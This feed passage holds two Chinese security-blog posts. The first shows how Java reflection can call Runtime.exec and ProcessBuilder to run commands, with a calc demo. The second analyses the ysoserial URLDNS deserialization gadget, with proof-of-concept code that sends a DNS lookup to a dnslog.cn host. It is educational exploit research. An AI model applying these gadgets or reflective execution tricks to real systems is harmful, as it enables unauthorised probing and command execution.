    <link href="https://summersec.github.io/2020/05/12/%E4%BB%8E%E5%AE%89%E5%85%A8%E8%A7%92%E5%BA%A6%E8%B0%88Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6--%E5%89%8D%E7%AB%A0/"/>
    <id>https://summersec.github.io/2020/05/12/%E4%BB%8E%E5%AE%89%E5%85%A8%E8%A7%92%E5%BA%A6%E8%B0%88Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6--%E5%89%8D%E7%AB%A0/</id>
    <published>2020-05-12T04:42:16.000Z</published>
    <updated>2020-05-13T02:29:56.559Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首发：<a href="https://www.sec-in.com/article/307" target="_blank" rel="noopener">https://www.sec-in.com/article/307</a><br>&emsp;&emsp; 欢迎回来，上回说到Java反射机制基础知识，并用简单代码做了一个简单的Demo。<br>&emsp;&emsp;笔者从执行命令的角度来展开话题，看这篇文章大部分都是网络安全的从业者亦或者是安全规范的学习者，众所周知执行命令获取权限是安全人员追求，也是黑客最终追求。所以从执行命令的角度来展开，无疑是激发你们读者最大阅读兴趣。</p><p> ps: 本文实验代码都上传<a href="https://github.com/samny520/JavaLearnVulnerability" target="_blank" rel="noopener">JavaLearnVulnerability</a>项目，为了让更多人知道，麻烦动动小手star一下。</p><hr><h1 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h1><p>&emsp;&emsp; 这里稍微补充一点小知识，对于一些0基础的读者的一些知识补充，老司机可以忽视。Java执行命令常见的有两个类<code>java.lang.Runtime</code>和<code>java.lang.ProcessBuilder</code>，通常情况下使用<code>java.lang.Runtime</code>类，个人觉得Runtime类是比ProcessBuilder好使用些。</p><h2 id="windows下执行命令的几种方式"><a href="#windows下执行命令的几种方式" class="headerlink" title="windows下执行命令的几种方式"></a>windows下执行命令的几种方式</h2><ol><li>Windows下调用程序 <blockquote><p>Process proc =Runtime.getRuntime().exec(“exefile”);</p><ol start="2"><li>Windows下调用系统命令<br>String [] cmd={“cmd”,”/C”,”copy exe1 exe2”};<br>Process proc =Runtime.getRuntime().exec(cmd);</li><li>Windows下调用系统命令并弹出命令行窗口<br>String [] cmd={“cmd”,”/C”,”start copy exe1 exe2”};<br>Process proc =Runtime.getRuntime().exec(cmd);</li></ol></blockquote><h2 id="Linux下执行命令的几种方式"><a href="#Linux下执行命令的几种方式" class="headerlink" title="Linux下执行命令的几种方式"></a>Linux下执行命令的几种方式</h2><ol><li>Linux下调用程序<blockquote><p>Process proc =Runtime.getRuntime().exec(“./exefile”);</p></blockquote></li><li>Linux下调用系统命令<blockquote><p>String [] cmd={“/bin/sh”,”-c”,”ln -s exe1 exe2”};<br>Process proc =Runtime.getRuntime().exec(cmd);</p></blockquote></li><li>Linux下调用系统命令并弹出命令行窗口<blockquote><p>String [] cmd={“/bin/sh”,”-c”,”xterm -e ln -s exe1 exe2”};<br>Process proc =Runtime.getRuntime().exec(cmd);</p></blockquote></li></ol></li></ol><hr><h1 id="反射之Runtime"><a href="#反射之Runtime" class="headerlink" title="反射之Runtime"></a>反射之Runtime</h1><p><img src="https://img-blog.csdnimg.cn/20200428212414156.gif" alt="在这里插入图片描述"></p><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><blockquote><p>Object ob = cls.getMethod(“getRuntime”,null).invoke(null,null);<br>返回的是一个Runtime类对象<br>前文说过，invoke第一个参数是一个<code>Object类对象</code><br>你可能好奇为什么我不直接使用<code>newInstance()</code>呢？<br>因为Runtime类中的无参构造方法是private权限，无法访问。ps：其实是有办法的，下文会说道。<br><code>getRuntime</code>方法返回的是Runtime类对象，这就是为什么有些payload会使用此方法了，而不是直接newInstanc()</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200428204852586.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Method1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取对象</span></span><br><span class="line">            Class cls = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">            <span class="comment">//实例化对象</span></span><br><span class="line">            Object ob = cls.getMethod(<span class="string">"getRuntime"</span>,<span class="keyword">null</span>).invoke(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">            <span class="comment">// 反射调用执行命令</span></span><br><span class="line">            cls.getMethod("exec", String.class).invoke(ob,"calc");</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><blockquote><p>前文说过java.lang.Runtime类无参构造方法是private权限无法直接调用<br>setAccessible通过反射修改方法的访问权限，强制可以访问<br> Constructor constructor = cls.getDeclaredConstructor();是获取类构造器方法的方法</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Method2</span><span class="params">()</span></span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// 获取对象</span></span><br><span class="line">           Class cls = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">           <span class="comment">// 获取构造方法</span></span><br><span class="line">           Constructor constructor = cls.getDeclaredConstructor();</span><br><span class="line">           </span><br><span class="line">           constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">           <span class="comment">// 实例化对象</span></span><br><span class="line">           Object ob = constructor.newInstance();</span><br><span class="line">           Method mt = cls.getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">           mt.invoke(ob,<span class="string">"calc"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       &#125; <span class="keyword">catch</span> (ClassNotFoundException | NoSuchMethodException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><hr><h1 id="反射之ProcessBuilder"><a href="#反射之ProcessBuilder" class="headerlink" title="反射之ProcessBuilder"></a>反射之ProcessBuilder</h1><p><img src="https://img-blog.csdnimg.cn/20200428212703809.gif" alt="在这里插入图片描述"></p><p>通过看JDK文档，ProcessBuilder类有两个构造方法。<br><img src="https://img-blog.csdnimg.cn/20200428204717485.png" alt="在这里插入图片描述"><br>如果分别使用反射构造方法获取实例化语句如下：</p><ul><li><code>Class.forName(&quot;java.lang.ProcessBuilder&quot;).getDeclaredConstructor(List.class).newInstance(Arrays.asList(&quot;calc&quot;)))</code></li><li><code>Class.forName(&quot;java.lang.ProcessBuilder&quot;).getDeclaredConstructor(String.class).newInstance(&quot;calc&quot;))</code></li></ul><h2 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h2><p>&emsp;&emsp; 方法一笔者在此就提一点，<code>newInstance()</code>实例化时把所需要执行命令参数直接一并进行了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Method1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取对象</span></span><br><span class="line">            Class cls = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>);</span><br><span class="line">            <span class="comment">// 实例化对象</span></span><br><span class="line">            Object ob = cls.getDeclaredConstructor(List<span class="class">.<span class="keyword">class</span></span></span><br><span class="line">            ).newInstance(Arrays.asList("calc"));</span><br><span class="line">            <span class="comment">// 执行命令</span></span><br><span class="line">            cls.getMethod(<span class="string">"start"</span>).invoke(ob,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><h2 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h2><p>&emsp;&emsp; 方法二使用第二种构造方法，可变长参数(<code>String...</code>表示参数长度不确定)。那么对于反射来说，如果要获取目标函数里包含的可变长参数，可直接视为数组。因此只需要将<code>String [].class</code>传给构造方法即可，但在调用<code>newInstance()</code>实例化方法时，不能直接传一个一维数组<code>String[]{“calc&quot;}</code>，而是应该传入一个二维数组<code>String[][]calc</code>。因为<code>newInstance()</code>函数本身接收的是一个可变长参数，我们传给<code>ProcessBuilder</code>的也是一个可变长参数，二者叠加由一维数组变成了二维数组。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Method2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取对象</span></span><br><span class="line">            Class cls = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>);</span><br><span class="line">            <span class="comment">// 实例化对象</span></span><br><span class="line">            </span><br><span class="line">            String[][] cls2 = <span class="keyword">new</span> String[][]&#123;&#123;<span class="string">"calc"</span>&#125;&#125;;</span><br><span class="line">            Object ob = cls.getConstructor(String[]<span class="class">.<span class="keyword">class</span>).<span class="title">newInstance</span>(<span class="title">cls2</span>)</span>;</span><br><span class="line">            <span class="comment">//执行命令</span></span><br><span class="line">            cls.getMethod(<span class="string">"start"</span>).invoke(ob,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/7029#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/7029#toc-3</a><br><a href="https://javasec.org/javase/Reflection/Reflection.html" target="_blank" rel="noopener">https://javasec.org/javase/Reflection/Reflection.html</a><br>JDK文档<br>Java安全漫谈-反射篇 –P牛著。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;首发：&lt;a href=&quot;https://www.sec-in.com/article/307&quot; target=&quot;_blank&quot; rel=&quot;n
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java反射" scheme="https://summersec.github.io/tags/Java%E5%8F%8D%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>小楼昨夜又春风，你知ysoserial-Gadget-URLDNS多少？</title>
    <link href="https://summersec.github.io/2020/05/06/%E5%B0%8F%E6%A5%BC%E6%98%A8%E5%A4%9C%E5%8F%88%E6%98%A5%E9%A3%8E%EF%BC%8C%E4%BD%A0%E7%9F%A5ysoserial-Gadget-URLDNS%E5%A4%9A%E5%B0%91%EF%BC%9F/"/>
    <id>https://summersec.github.io/2020/05/06/%E5%B0%8F%E6%A5%BC%E6%98%A8%E5%A4%9C%E5%8F%88%E6%98%A5%E9%A3%8E%EF%BC%8C%E4%BD%A0%E7%9F%A5ysoserial-Gadget-URLDNS%E5%A4%9A%E5%B0%91%EF%BC%9F/</id>
    <published>2020-05-06T04:42:16.000Z</published>
    <updated>2020-05-06T07:17:45.990Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文章首发：<a href="https://www.sec-in.com/article/299" target="_blank" rel="noopener">https://www.sec-in.com/article/299</a><br>&emsp;&emsp;2015年Gabriel Lawrence(@gebl)和Chris Frohoff(@frohoff)在AppSecCali大会上提出的利用Apache Commons Collections来构造命令执行利用链，随后发布ysoserial工具，从此打开Java安全的蓝海。<br>&emsp;&emsp; 利用链(gadget chains)，俗称gadget。通俗来说就是一种利用方法，它是从触发位置开始到执行命令的位置结束，也可以说是漏洞验证方法(POC)。<br>&emsp;&emsp; 使用方法，GitHub下载jar包或者git源码自己编译。</p><blockquote><p>java -jar ysoseial.jar URLDNS “<a href="http://baidu.com&quot;" target="_blank" rel="noopener">http://baidu.com&quot;</a></p></blockquote><p>再将生成号POC发送目标，如果目标存在反序列化漏洞，并且满足利用链条件，则命令将会被执行。</p><p>ps: 本文实验代码都上传<a href="https://github.com/samny520/JavaLearnVulnerability" target="_blank" rel="noopener">JavaLearnVulnerability</a>项目，为了让更多人知道，麻烦动动小手star一下。</p><hr><h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><p> &emsp;&emsp; <code>URLDNS</code>是其中的一个gadget的名字，此gadget不能执行命令，通常用来验证目标是否存在反序列化漏洞。URLDNS gadget十分适合用来验证目标是否存在反序列化漏洞。</p><ul><li>此gadget完全使用Java内置的类构造，无需第三方库支持。</li><li>如果目标没有回显，通过DNS解析请求是否存在来判断存在反序列化漏洞。</li></ul><hr><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>打开<code>https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</code>查看源码，但笔者这里使用自己改写的源码来分析此gadget链。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> samny.serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> samny.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">urldns</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        URLStreamHandler handler = <span class="keyword">new</span> URLStreamHandler() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span></span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        HashMap hm = <span class="keyword">new</span> HashMap();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="keyword">null</span>,<span class="string">"http://4h9yq1.dnslog.cn"</span>,handler);</span><br><span class="line">        hm.put(url,url);</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(url,<span class="string">"hashCode"</span>,-<span class="number">1</span>);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"url"</span>));</span><br><span class="line">        oos.writeObject(hm);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"url"</span>));</span><br><span class="line"><span class="comment">// 注释这行代码是不会产生dns解析请求，</span></span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>&emsp;&emsp; 漏洞分析之前，我们先看看漏洞执行效果。<br>&emsp;&emsp; 分析一个在线dns解析记录网站<a href="http://www.dnslog.cn" target="_blank" rel="noopener">DNSlog Platform</a>，网站无需任何登录注册，国内访问速度也快，DNS记录获取速度没得说，子域名可以无限更换。<br><img src="https://img-blog.csdnimg.cn/20200427153912402.png" alt="在这里插入图片描述"><br><strong>漏洞复现步骤</strong></p><ol><li>修改你能过记录dns解析的网址。<br><img src="https://img-blog.csdnimg.cn/20200427154428787.png" alt="在这里插入图片描述"></li><li>直接运行main方法，刷新记录。</li></ol><h2 id="断点分析"><a href="#断点分析" class="headerlink" title="断点分析"></a>断点分析</h2><p>&emsp;&emsp; 触发反序列化漏洞的方法是<code>readObject</code>，所以笔者在43行代码处和<code>hashmap</code>的<code>readObject</code>各设置一个断点。<br>PS:</p><ul><li>以免dns记录混淆，建议每次分析都换一个域名。</li><li>此处会有一个问题就是我们到底怎么在JDK包中找到HashMap这个类的readobject函数呢？因为JDK的类超级多，难道我们必须要一个个翻找？</li><li>其实搜索是可以搜索导入包的内容的，<code>Ctrl+Shift+F</code> 在<code>Scope - All Places</code>搜索<code>class hashmap</code>即可。<br><img src="https://img-blog.csdnimg.cn/20200427155537417.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 断点设置好了，开始分析，笔者这里直接从HashMap.java的<code>readObject</code>开始分析。<br>hashmap中readObject会调用putVal方法是往HashMap中放入键值对的方法，进而会计算hashcode值。<br><img src="https://img-blog.csdnimg.cn/20200427155709722.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 接着会判断key是否为空，hashCode是否不等于-1，不等于-1会直接返回，等于-1会重新计算。这时候我们看笔者写源码36行，修改方法hashCode的值为-1，这时你是否明白此时的用意。<br><img src="https://img-blog.csdnimg.cn/20200427160955616.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200427161035866.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200427161223686.png" alt="在这里插入图片描述"></li></ul><p>&emsp;&emsp; 计算<code>hash</code>的时候会跳转到<code>java.net.URLStreamHandler.java#hashCode</code>方法来计算hash。注意看图片中被框住的一行代码，hashCode在计算hash时，会调用<code>getHostAddress()</code>方法，进而调用<code>getByName(host)</code>方法。<br><img src="https://img-blog.csdnimg.cn/20200427161513369.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 执行方法，我们发现会有一个等待时间大概2秒钟之后(其实就是DNS解析所需要的时间)，可以获取DNS解析记录。<br><img src="https://img-blog.csdnimg.cn/20200427162302103.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20200427162013698.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020042716232791.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200427162708718.png" alt="在这里插入图片描述"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>&emsp;&emsp; 整个的<code>URLDNS</code>的gadget其实清晰又简单。</p><ol><li>HashMap-&gt;readObject()</li><li>HashMap-&gt;hash()</li><li>URL-&gt;hashCode()</li><li>URLStreamHandler-&gt;hashCode()</li><li>URLStreamHandler-&gt;getHostAddress()</li><li>InetAddress-&gt;getByName()</li></ol><p>&emsp;&emsp; 其实作者在博客中写道，可以用四行代码就可以实现此gadget chains，反观ysoserial中源码，去掉注释也多还有几行代码，<code>多出的代码时干嘛的呢？</code></p><p><img src="https://img-blog.csdnimg.cn/20200427164430117.png" alt="在这里插入图片描述"></p><h2 id="巧妙避免重复"><a href="#巧妙避免重复" class="headerlink" title="巧妙避免重复"></a>巧妙避免重复</h2><p>&emsp;&emsp; 多出几行代码，我们来分析一下。ysoserial的作者重写了URLStreamHandler其中两个方法。但是我们还没搞清楚其中的作用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">URLStreamHandler handler = <span class="keyword">new</span> URLStreamHandler() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span></span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 老规矩，断点撸码。不过此时断点应该设置在哪？笔者按照源作者的代码，去掉序列化和反序列化的过程。剩下代码也就上面的和下面图片给出的5行代码，分析不难发现断点应该设置在<code>hm.put()</code>。其中31和32行代码肯定是不会去设置断点的，至于36行在之前就说明其作用。<br><img src="https://img-blog.csdnimg.cn/20200427171425793.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 调试代码不能发现，put方法也和hashmap中的readObject方法的方法是差不多的，继续跟进。<br><img src="https://img-blog.csdnimg.cn/20200427171917233.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 继续跟进还是来到<code>java.net.URLStreamHandler#hashCode</code>方法，但此时方法会跳转到笔者复写的方法中，返回应该<code>null</code>，进而就不会去解析dns。<br><img src="https://img-blog.csdnimg.cn/20200427172155144.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200427172348537.png" alt="在这里插入图片描述"></p><hr><p>&emsp;&emsp; 为什么hashmap中putval方法就不会跳转到我们复现的类方法里面返回一个null呢？（个人见解，源码无法修改所以无法调试）<br>答：反序列化时应该时将二进制代码直接读取，进去调用hashmap中readObject方法，此时反序列化完全是使用jdk源码调用，不会再去看我们用户复写方法。<br>&emsp;&emsp; 笔者这里有点事实可以整明我的观点。<br>众所周知Java是代码是一行一行的去编译解释的，我们复现的类URLStreamHandler，实现的类对象hander在url进实例化的时候处理了，也就是33行代码。但是进行反序列化操作的时候，并没有将此复现方法进行序列化，所以反序列化的时候不会处理URL，计算hash值的时候，不可能跳转到我们复写的方法返回一个null，只能是跳转到原本的方法中。<br><img src="https://img-blog.csdnimg.cn/20200427174533677.png" alt="在这里插入图片描述"></p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp; 当URL最初被放在HashMap中时，通过可以调用put，HashMap.hashMap.hash方法被调用。这个方法反过来又会调用该URL的hashCode，但是hashCode是有一个缓存值的，并不会触发DNS解析。但是我们可以在读取数据流的时候，在URL添加到HashMap中重置缓存值(使其hashCode=-1)，来确保DNS解析。可以使用Java的Reflection中setFieldValue方法来达到重置hashCode值为-1。<br>&emsp;&emsp; Ysoserial用一个类复写完美避免重复DNSLOG，感概其作者的神奇逻辑思维能力。有兴趣的朋友完全可以去注释掉<code>getHostAddress</code>方法亦或者是删除掉整个handler代码，然后就会出现DNSLOG。</p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>P神Java安全漫谈 - 08.反序列化篇(2)<br><a href="https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/" target="_blank" rel="noopener">https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</a><br><a href="https://lalajun.github.io/2020/03/05/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-ysoserial-URLDNS/" target="_blank" rel="noopener">https://lalajun.github.io/2020/03/05/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-ysoserial-URLDNS/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;文章首发：&lt;a href=&quot;https://www.sec-in.com/article/299&quot; target=&quot;_blank&quot; rel=
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
